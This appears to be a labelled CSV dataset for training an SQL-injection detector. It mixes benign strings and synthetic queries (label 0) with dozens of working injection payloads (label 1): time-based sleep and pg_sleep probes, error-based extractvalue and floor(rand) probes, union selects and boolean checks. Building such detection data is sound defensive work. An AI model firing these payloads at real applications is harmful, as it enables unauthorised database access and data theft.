Sentence,Label
"1',  (  select   (  case when   (  5154  =  5154  )   then 1 else 5154*  (  select 5154 from master..sysdatabases  )   end   )    )   ",1
linero-noro@cocheacoche.uy,0
ti20,0
07375030b,0
select   (  case when   (  9030  =  9185  )   then 9030 else 9030*  (  select 9030 from information_schema.character_sets  )   end  )  #,1
"   SELECT important, kill, whyFROM snow WHERE creature  IS NOT NULL",0
1%'   )    )     )   and sleep  (  5  )  #,1
5568410000000000,0
2399,0
 (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and 'fdgq'  =  'fdgq,1
7983170000000000,0
"1"" and elt  (  4594  =  1040,1040  )  ",1
SELECT * FROM there WHERE gate BETWEEN '1996-07-01' AND '1996-07-31',0
villazala,0
tabakov@wdsl.ly,0
belalczar,0
SELECT * FROM matter,0
SELECT * FROM consonant WHERE using LIKE '%book%',0
1'   )    )    as bbdf where 1327  =  1327,1
en9r195d9,0
SELECT MIN ( hung )  AS shaking FROM breakfast,0
datario,0
6660,0
"1%' procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and '%'  =  '",1
SELECT COUNT ( DISTINCT cattle )  FROM coach,0
SELECT COUNT ( married ) FROM tall,0
SELECT AVG ( locate )  FROM pilot  SELECT SUM ( practice ) ,0
bose,0
"1'  )   as hlbq where 2347  =  2347 and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --",1
SELECT DISTINCT children FROM were,0
"SELECT wp_posts.* FROM wp_posts WHERE ID IN  ( 262310,262326,262328 ) ",0
"  SELECT workerID AS ID, mostly AS spin FROM room",0
63545647m,0
"INSERT INTO little  ( air, slowly, movie )  VALUES  ( 'pressure', 'search', 'classroom' )  ",0
eldredge,0
SELECT COUNT ( impossibleID ) FROM belt,0
00033926r,0
bogarde4@tiendasyofertas.museum,0
budd9,0
66564863b,0
1%'  )   and   (  3020  =  3020  )  *6703 and   (  '%'  =  ',1
"1""  )   as xylo where 2112  =  2112 and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --",1
"  SELECT * FROM consonant WHERE follow IN  ( 'opinion', 'copy', 'lunch' )  ",0
SELECT * FROM entire WHERE    NOT sat = 'air',0
"  SELECT general,ourselves,farther FROM vowel LEFT JOIN Orders ON lift.continuedID =  cattle.trip ORDER BY bent.respect",0
SELECT * FROM die WHERE hunter = 'driving',0
"1'  )   where 6772  =  6772 and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )  --",1
"1' procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )  ",1
SELECT plane FROM require,0
castell de rugat,0
siu-ling,0
bu7c2pi,0
"SELECT LOWER ( ""SQL Tutorial is FUN!"" ) ; ",0
203614000000000,0
SELECT * FROM to FETCH FIRST 50 PERCENT ROWS ONLY,0
SELECT * FROM gather WHERE watch BETWEEN '1996-07-01' AND '1996-07-31',0
80,0
SELECT COUNT ( him ) FROM doing,0
SELECT AVG ( share ) FROM mine SELECT SUM ( front ) ,0
94lp90ulo,0
"INSERT INTO pilot  ( daughter, card, anyone )  VALUES  ( 'load', 'brick', 'experience' )  ",0
"1""  )   where 1699  =  1699 or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1
SELECT AVG ( Price ) FROM who,0
1   )    )    rlike   (  select   (  case when   (  6113  =  1222  )   then 1 else 0x28 end   )    )    and    (    (   2815  =  2815,1
"1""   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",1
"   SELECT pig, obtain, rising FROM according WHERE excited  IS NULL",0
"1%""  )   or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1
1  )   where 3030  =  3030,1
"1"" where 6352  =  6352",1
frades,0
eu,0
"-4798%'   )    )     )   union all select 3330,3330,3330#",1
"1'||  (  select 'qjwf' from dual where 3187  =  3187 and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null   )    )   ||'",1
SELECT * FROM language FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM are,0
"   SELECT Employees.regular, COUNT ( Orders.mountainID )  AS flagFROM    ( OrdersINNER JOIN lips ON Orders.gladID  =  Employees.plusID ) ",0
"pont de bar, el",0
"1""   )    )     )   and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and    (    (     (  ""staz"" like ""staz",1
"1""   )    )    as ynuw where 9138  =  9138",1
"1""   )    )    as wnzf where 3352  =  3352 or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1
DELETE FROM dangerous WHERE strike = 'picture',0
SELECT * FROM steam WHERE automobile = 'pen'  AND  ( electricity = 'instrument' OR ordinary = 'policeman' ) ,0
lima9za,0
"1""  )   as wmng where 5976  =  5976",1
DELETE FROM gave WHERE electric = 'between',0
"  SELECT fifth,split,stream FROM member LEFT JOIN Orders ON together.additionalID =  sad.small ORDER BY copy.gray",0
"-9176'   )    )    as eunw where 5978  =  5978 or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",1
"1%"" rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and ""%""  =  """,1
"1""   )    )    and elt  (  1210  =  1210,sleep  (  5   )    )    and    (    (   ""afby""  =  ""afby",1
SELECT * FROM birthday 3 SELECT * FROM impossible,0
SELECT Count ( * )  AS skill,0
"-8358'   )    )     )   union all select 7282,7282--",1
SELECT * FROM breeze WHERE accept = 'pet'  OR out = 'gave',0
valls,0
SELECT MIN ( stiff )  AS salt FROM plane,0
"1  )   as ghew where 6441  =  6441 union all select null,null--",1
SELECT TOP 50 PERCENT * FROM useful,0
23593437z,0
